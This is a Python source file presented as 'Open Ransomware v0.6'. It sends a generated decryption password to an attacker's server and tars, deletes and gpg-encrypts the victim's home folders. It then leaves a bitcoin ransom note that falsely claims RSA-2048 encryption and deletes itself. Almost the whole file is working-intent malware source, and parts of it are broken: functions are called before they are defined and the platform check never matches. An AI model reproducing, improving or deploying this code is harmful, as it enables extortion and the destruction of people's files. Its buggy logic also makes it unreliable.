'''                                                             
                       `.`..`````.`.`                       
                  ...-//+://+//+/+:++/-.`.                  
               `..-++oooooooooooooooooo++:..`               
            `..--/+ooooooooooooooooooooooo+:-..`            
          `..-://+oooooooooooooooooooooooooo+:-..`          
        `..-://+oooooooooooooooooooooooooooo+//:-..`        
       ..-:////+ooooooooo++ooooooooooooooooo+////:-..       
      ..-//////+ooooooo/////+oo+/////++oooooo//////-..      
     ..-////////+oooo///////+oo+///////+oooo////////:..     
    ..-/////////+oooo////:::/++/:::////+ooo+/////////-..    
   `.-///////////+ooo++:-..::-`.-..-:/+oooo+//////////-.`   
   ..://///////////ooo+/:`        `-/++oo+////////////:..   
   ..///////////////+/:.            `//////////////////-.   
   .-///////////////-:.              `:-///////////////-.`  
   .-///////////////-.`               .-///////////////-.`  
   .-/////ooo+//////-..              ..-//////ooo+/////-.`  
   ..:///+oooo+++////-..            ..-///+/+ooooo////:..   
   `.-//++oooooooo+++/:-..`      `..-:/+++oooooooo+///-.`   
    ..:/ooooooooooooo+++/:--`   --:/+oooooooooooooo+/:..    
    `.-:+ooo////+++oooooo+/:    -//+oooooo+++///+++/:-.`    
     `.-://////////++oo++/:`     /+/++o+///////////:-.`     
      `.-/+++++++++oooo+::`      `:+ooooo+++++++++:-.`      
        -/+ooooooooooo+/:-        .:/+ooooooooooo+:-`       
         .:++ooooo+///-..          `.-///+++ooo+//-         
          `.-+/+++///:..            ..-/////:++:-`          
             -:---:::..              ..:::-..:.             
                ``....`              `....``                
                                                            
	Open Ransomware v0.6
	by Tom Escolano
'''

#!/usr/bin/python3

import os
import sys
import subprocess
import random
import string
import urllib
import re


directories = ['~/' , '~/Documents/' , '~/Desktop/' , '~/Images/' , '~/Music/'] #Directories to encrypt
bitcoin	= '' #Your Bitcoin address
price = 0 #Price of the password
url = '' #URL to your credentials storing php file

#Verify that required variables are valid and not empty
if(directories == '' or\
	type(directories) != list or\
   bitcoin == '' or\
   len(bitcoin) != 34 or\
   price == 0 or\
   type(price) != int or\
   re.findall('http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', url) == [] or\
   url == ''):
	sys.exit('Please fill correctly the required variables.')

#Compatibility
if(sys.platform == 'Linux'):
	linux()
elif(sys.platform == 'Windows'):
	sys.exit('Soon supported !')
else:
	sys.exit('Not supported !')

def linux():
	if(os.geteuid() == 0):
		directories.append('/root/')

	#Generate the decryption password
	s = string.ascii_lowercase + string.digits
	pwd = str(''.join(random.sample(s, 30)))

	#Generate the unique ID
	t = string.ascii_lowercase
	idd = str(''.join(random.sample(t, 10)))

	#Main stuff
	sendCred(url, pwd, idd)
	crypt(directories, pwd)
	howto(directories, bitcoin, price)
	decryptGen(directories)
	os.system('rm -rf ' + sys.argv[0])

	#Post the pass and the id to your server
	def sendCred(url, pwd, idd):

		userAgent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
		values = {'pass' : pwd,'id'	: idd}
		headers = { 'User-Agent' : userAgent }
		data = urllib.parse.urlencode(values)
		data = data.encode('ascii')
		req = urllib.request.Request(url, data, headers)
		response = urllib.request.urlopen(req)
		page = response.read()

		if(page != 'Ok.'):

			sys.exit('Credentials server returned an error. Quitting')

	#Encryption system
	def crypt(directory, pwd):
		
		if(type(directory) != list):

			sys.exit('Directory argument is not in the correct format.')

		for dirr in directory:

			os.system('cd ' + dirr)
			os.system('tar cvf encrypted.tar *')
			os.system('ls -a | grep -v encrypted.tar | xargs rm -rf')
			os.system('gpg --passphrase ' + pwd + ' -c encrypted.tar')
			os.system('rm encrypted.tar')

		#print("Encryption completed")

	
	#Explain how to recover files	
	def howto(directory, bitcoin, price):

		os.system("""echo 'Hi,\nWhat happened to your files?\nAll your files were protected by a strong encryption with RSA-2048\nMore information about the encryption keys using RSA-2048 can be found heres https://en.wikipedia.org/RSA\nWhat does this mean?\nThis mean that the structure and data within your files have been irrevocably change and only we can help you to restore it.\nHow did this happen?\nEspecially for you, on our server was generated the secret RSA-2048 password\nAll your files were encrypted with the public key, which has been transferred to your computer via internet.\nDecrypting of your files is only possible with the help of the GPG software, which we used to encrypt your files. It is already installed on your computer. All you need to decrypt your files is the 30 characters password.\nYou can buy this password that will recover all your files. It costs """ + str(price) + """ bitcoins and you need to send it to this bitcoin address\n""" + bitcoin + """ . 1 bitcoin ~= 240 US $.\nYou can make bitcoin payment without any bitcoin software. For this you can use one of this bitcoin exchanger from this list:\nhttps://www.btcgreece.com\nhttps://btctrader.com\nwww.plus500.gr/Bitcoins-CFD\nhttps://localbitcoins.com/country/GR\ncoinmill.com/BTC_GRD.html\nbtcdirect.eu\nlocalbitcoins.com\nCoincafe.com\ncoinrnr.com\nbitquick.co\nanxpro.com\nbittylicious.com\nOnce you send the Bitcoins, you will receive your password and use the decrypt.py script to decrypt your files.\n\nHave a nice day' > 'Help recover your files.txt'""")
		
		#Copy explanations to all the directories with encrypted files
		for dirr in directory:
		
			os.system("cp 'Help recover your files.txt' " + dirr)


	#Generate decrytion programm
	def decryptGen(directory):
		
		os.system("""echo "
			#!/usr/bin/python3
			import os
			import sys
			directory = """ + directory + """
			pwd = input('Please enter the password to decrypt files: ')
			for dirr in directory:
				os.system("cd " + dirr)
				if(os.system("gpg --passphrase " + pwd + " -d encrypted.tar.gpg > unencrypted.tar") != 0):
					sys.exit("Wrong password.")
				os.system("tar xvf unencrypted.tar")
				os.system("rm unencrypted.tar")
			" > ~/decrypt.py""")